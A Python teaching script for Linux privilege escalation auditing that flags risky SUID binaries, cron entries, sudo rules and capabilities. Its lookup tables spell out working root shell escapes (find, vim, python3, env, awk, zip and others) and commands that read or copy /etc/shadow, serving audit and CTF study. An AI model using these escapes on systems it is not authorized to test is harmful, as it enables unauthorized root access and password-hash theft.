"""
Example: Privilege Escalation — Linux
=======================================
SUID analyzer, cron job checker, sudo parser, and capability scanner.

IMPORTANT: For authorized security testing and CTF only.
"""

from dataclasses import dataclass, field
from enum import Enum


# ---------------------------------------------------------------------------
# SUID Binary Analysis (GTFOBins reference)
# ---------------------------------------------------------------------------

GTFOBINS_SUID = {
    "find": {"shell": "find . -exec /bin/sh -p \\;", "risk": "high"},
    "vim": {"shell": "vim -c ':!sh'", "risk": "high"},
    "python3": {"shell": "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
                "risk": "high"},
    "env": {"shell": "env /bin/sh -p", "risk": "high"},
    "nmap": {"shell": "nmap --interactive (old) or nmap --script=<shell>",
             "risk": "high"},
    "less": {"shell": "less /etc/shadow  -> !sh", "risk": "high"},
    "bash": {"shell": "bash -p", "risk": "critical"},
    "cp": {"shell": "cp /etc/shadow /tmp/ (file read)", "risk": "medium"},
}

SAFE_SUID = {"passwd", "ping", "su", "sudo", "mount", "umount",
             "chsh", "chfn", "newgrp"}


@dataclass
class SuidAnalysis:
    path: str
    binary_name: str
    exploitable: bool
    technique: str
    risk: str


def analyze_suid(path: str) -> SuidAnalysis:
    """Analyze a SUID binary for privilege escalation potential."""
    name = path.rsplit("/", 1)[-1]
    if name in GTFOBINS_SUID:
        info = GTFOBINS_SUID[name]
        return SuidAnalysis(path, name, True, info["shell"], info["risk"])
    if name in SAFE_SUID:
        return SuidAnalysis(path, name, False, "Standard SUID binary", "none")
    return SuidAnalysis(path, name, False, "Unknown — investigate manually", "unknown")


# ---------------------------------------------------------------------------
# Cron Job Analysis
# ---------------------------------------------------------------------------

class CronRisk(Enum):
    WORLD_WRITABLE_SCRIPT = "Script is world-writable"
    WILDCARD_INJECTION = "Tar/rsync wildcard in writable directory"
    PATH_HIJACK = "Relative command without full path"
    WRITABLE_DIRECTORY = "Script directory is world-writable"


@dataclass
class CronAnalysis:
    schedule: str
    command: str
    user: str
    risks: list[CronRisk] = field(default_factory=list)

    @property
    def exploitable(self) -> bool:
        return len(self.risks) > 0


def analyze_cron(schedule: str, user: str, command: str,
                 file_perms: str = "", dir_writable: bool = False) -> CronAnalysis:
    """Analyze a cron entry for exploitation opportunities."""
    risks = []
    if file_perms and file_perms.endswith("rwx"):
        risks.append(CronRisk.WORLD_WRITABLE_SCRIPT)
    if "*" in command and ("tar" in command or "rsync" in command):
        risks.append(CronRisk.WILDCARD_INJECTION)
    if not command.startswith("/") and "/" not in command.split()[0]:
        risks.append(CronRisk.PATH_HIJACK)
    if dir_writable:
        risks.append(CronRisk.WRITABLE_DIRECTORY)
    return CronAnalysis(schedule, command, user, risks)


# ---------------------------------------------------------------------------
# Sudo Entry Parser
# ---------------------------------------------------------------------------

@dataclass
class SudoEntry:
    raw: str
    run_as: str
    nopasswd: bool
    command: str
    escalation: bool
    technique: str


SUDO_ESCALATION = {
    "vim": "vim -> :!sh",
    "less": "less -> !sh",
    "find": "find -exec /bin/sh \\;",
    "env": "env /bin/sh",
    "python3": "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",
    "perl": "perl -e 'exec \"/bin/sh\"'",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "nmap": "nmap --interactive -> !sh",
    "apt-get": "apt-get changelog -> !/bin/sh",
    "zip": "zip /tmp/a /etc/hosts -T --unzip-command='sh -c /bin/sh'",
}


def parse_sudo_entry(entry: str) -> SudoEntry:
    """Parse sudo -l entry and check for escalation."""
    nopasswd = "NOPASSWD" in entry
    parts = entry.replace("NOPASSWD:", "").strip().split()
    run_as = parts[0] if parts else "(ALL)"
    command = parts[-1] if parts else ""
    cmd_name = command.rsplit("/", 1)[-1]

    if cmd_name in SUDO_ESCALATION:
        return SudoEntry(entry, run_as, nopasswd, command, True,
                         SUDO_ESCALATION[cmd_name])
    return SudoEntry(entry, run_as, nopasswd, command, False, "N/A")


# ---------------------------------------------------------------------------
# Linux Capabilities
# ---------------------------------------------------------------------------

DANGEROUS_CAPS = {
    "cap_setuid": "Set process UID -> become root",
    "cap_setgid": "Set process GID -> become root group",
    "cap_dac_override": "Bypass file permission checks",
    "cap_dac_read_search": "Read any file on the system",
    "cap_sys_admin": "Broad admin operations (mount, etc.)",
    "cap_sys_ptrace": "Trace/inject into any process",
    "cap_net_raw": "Raw network access (packet sniffing)",
}


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def demo():
    print("Privilege Escalation — Linux Examples")
    print("=" * 50)

    # SUID analysis
    print("\nSUID Binary Analysis:")
    test_binaries = ["/usr/bin/find", "/usr/bin/passwd",
                     "/usr/bin/python3", "/usr/bin/ping"]
    for path in test_binaries:
        result = analyze_suid(path)
        status = "EXPLOITABLE" if result.exploitable else "safe"
        print(f"  [{status:11s}] {path}")
        if result.exploitable:
            print(f"    Technique: {result.technique}")

    # Cron analysis
    print("\nCron Job Analysis:")
    cron = analyze_cron("* * * * *", "root", "/opt/scripts/backup.sh",
                        file_perms="-rwxrwxrwx")
    print(f"  {cron.command}: Exploitable={cron.exploitable}")
    for risk in cron.risks:
        print(f"    Risk: {risk.value}")

    cron2 = analyze_cron("*/5 * * * *", "root",
                         "cd /tmp && tar czf /backup/tmp.tar.gz *")
    print(f"  {cron2.command}: Exploitable={cron2.exploitable}")
    for risk in cron2.risks:
        print(f"    Risk: {risk.value}")

    # Sudo parsing
    print("\nSudo Entry Analysis:")
    entries = [
        "(ALL) NOPASSWD: /usr/bin/vim",
        "(ALL) NOPASSWD: /usr/bin/env",
        "(root) /usr/bin/apt-get update",
    ]
    for entry in entries:
        result = parse_sudo_entry(entry)
        status = "ESCALATION" if result.escalation else "limited"
        print(f"  [{status:10s}] {entry}")
        if result.escalation:
            print(f"    Technique: {result.technique}")

    # Capabilities
    print("\nDangerous Linux Capabilities:")
    for cap, desc in DANGEROUS_CAPS.items():
        print(f"  {cap:25s} -> {desc}")


if __name__ == "__main__":
    demo()
